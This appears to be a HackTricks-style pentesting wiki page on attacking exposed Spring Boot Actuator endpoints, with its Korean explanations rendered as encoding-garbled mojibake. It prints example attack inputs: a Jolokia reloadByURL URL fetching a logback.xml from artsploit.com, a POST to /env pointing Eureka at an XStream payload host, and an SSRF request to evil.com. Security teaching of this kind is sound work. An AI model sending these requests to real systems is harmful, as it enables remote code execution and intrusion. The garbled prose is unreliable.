# Spring Actuators

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}

## **Spring Auth Bypass**

<figure><img src="../../.gitbook/assets/image (927).png" alt=""><figcaption></figcaption></figure>

**From** [**https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png**](https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png)\*\*\*\*

## Exploiting Spring Boot Actuators

**Check the original post from** \[**https://www.veracode.com/blog/research/exploiting-spring-boot-actuators**]

### **Key Points:**

* Spring Boot ActuatorsëŠ” `/health`, `/trace`, `/beans`, `/env` ë“±ì˜ ì—”ë“œí¬ì¸íŠ¸ë¥¼ ë“±ë¡í•©ë‹ˆë‹¤. 1ì—ì„œ 1.4 ë²„ì „ê¹Œì§€ëŠ” ì´ëŸ¬í•œ ì—”ë“œí¬ì¸íŠ¸ì— ì¸ì¦ ì—†ì´ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. 1.5 ë²„ì „ë¶€í„°ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ `/health`ì™€ `/info`ë§Œ ë¹„ë¯¼ê°í•˜ì§€ë§Œ, ê°œë°œìë“¤ì´ ì¢…ì¢… ì´ ë³´ì•ˆì„ ë¹„í™œì„±í™”í•©ë‹ˆë‹¤.
* íŠ¹ì • Actuator ì—”ë“œí¬ì¸íŠ¸ëŠ” ë¯¼ê°í•œ ë°ì´í„°ë¥¼ ë…¸ì¶œí•˜ê±°ë‚˜ í•´ë¡œìš´ ì‘ì—…ì„ í—ˆìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
* `/dump`, `/trace`, `/logfile`, `/shutdown`, `/mappings`, `/env`, `/actuator/env`, `/restart`, `/heapdump`.
* Spring Boot 1.xì—ì„œëŠ” ì•¡ì¶”ì—ì´í„°ê°€ ë£¨íŠ¸ URL ì•„ë˜ì— ë“±ë¡ë˜ì§€ë§Œ, 2.xì—ì„œëŠ” `/actuator/` ê¸°ë³¸ ê²½ë¡œ ì•„ë˜ì— ìˆìŠµë‹ˆë‹¤.

### **Exploitation Techniques:**

1. **'/jolokia'ë¥¼ í†µí•œ ì›ê²© ì½”ë“œ ì‹¤í–‰**:
* `/jolokia` ì•¡ì¶”ì—ì´í„° ì—”ë“œí¬ì¸íŠ¸ëŠ” Jolokia ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ë…¸ì¶œí•˜ì—¬ MBeansì— ëŒ€í•œ HTTP ì ‘ê·¼ì„ í—ˆìš©í•©ë‹ˆë‹¤.
* `reloadByURL` ì‘ì—…ì€ ì™¸ë¶€ URLì—ì„œ ë¡œê¹… êµ¬ì„±ì„ ë‹¤ì‹œ ë¡œë“œí•˜ë„ë¡ ì•…ìš©ë  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ë¸”ë¼ì¸ë“œ XXE ë˜ëŠ” ì¡°ì‘ëœ XML êµ¬ì„±ì„ í†µí•œ ì›ê²© ì½”ë“œ ì‹¤í–‰ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ì˜ˆì‹œ ì•…ìš© URL: `http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml`.
2. **'/env'ë¥¼ í†µí•œ êµ¬ì„± ìˆ˜ì •**:
* Spring Cloud ë¼ì´ë¸ŒëŸ¬ë¦¬ê°€ ì¡´ì¬í•˜ëŠ” ê²½ìš°, `/env` ì—”ë“œí¬ì¸íŠ¸ëŠ” í™˜ê²½ ì†ì„±ì„ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ì†ì„±ì€ ì·¨ì•½ì ì„ ì•…ìš©í•˜ê¸° ìœ„í•´ ì¡°ì‘ë  ìˆ˜ ìˆìœ¼ë©°, ì˜ˆë¥¼ ë“¤ì–´ Eureka serviceURLì˜ XStream ì—­ì§ë ¬í™” ì·¨ì•½ì ì´ ìˆìŠµë‹ˆë‹¤.
* ì˜ˆì‹œ ì•…ìš© POST ìš”ì²­:

```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream
```
3. **ê¸°íƒ€ ìœ ìš©í•œ ì„¤ì •**:
* `spring.datasource.tomcat.validationQuery`, `spring.datasource.tomcat.url`, `spring.datasource.tomcat.max-active`ì™€ ê°™ì€ ì†ì„±ì€ SQL ì¸ì ì…˜ì´ë‚˜ ë°ì´í„°ë² ì´ìŠ¤ ì—°ê²° ë¬¸ìì—´ ë³€ê²½ê³¼ ê°™ì€ ë‹¤ì–‘í•œ ì•…ìš©ì„ ìœ„í•´ ì¡°ì‘ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### **Additional Information:**

* ê¸°ë³¸ ì•¡ì¶”ì—ì´í„°ì˜ í¬ê´„ì ì¸ ëª©ë¡ì€ [ì—¬ê¸°](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* Spring Boot 2.xì˜ `/env` ì—”ë“œí¬ì¸íŠ¸ëŠ” ì†ì„± ìˆ˜ì •ì„ ìœ„í•´ JSON í˜•ì‹ì„ ì‚¬ìš©í•˜ì§€ë§Œ, ì¼ë°˜ì ì¸ ê°œë…ì€ ë™ì¼í•©ë‹ˆë‹¤.

### **Related Topics:**

1. **Env + H2 RCE**:
* `/env` ì—”ë“œí¬ì¸íŠ¸ì™€ H2 ë°ì´í„°ë² ì´ìŠ¤ì˜ ì¡°í•©ì„ ì•…ìš©í•˜ëŠ” ë°©ë²•ì— ëŒ€í•œ ìì„¸í•œ ë‚´ìš©ì€ [ì—¬ê¸°](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
2. **ì˜ëª»ëœ ê²½ë¡œ ì´ë¦„ í•´ì„ì„ í†µí•œ Spring Bootì˜ SSRF**:
* Spring í”„ë ˆì„ì›Œí¬ì˜ ë§¤íŠ¸ë¦­ìŠ¤ ë§¤ê°œë³€ìˆ˜(`;`) ì²˜ë¦¬ ë°©ì‹ì€ ì„œë²„ ì¸¡ ìš”ì²­ ìœ„ì¡°(SSRF)ë¥¼ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ì˜ˆì‹œ ì•…ìš© ìš”ì²­:

```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
</details>
{% endhint %}
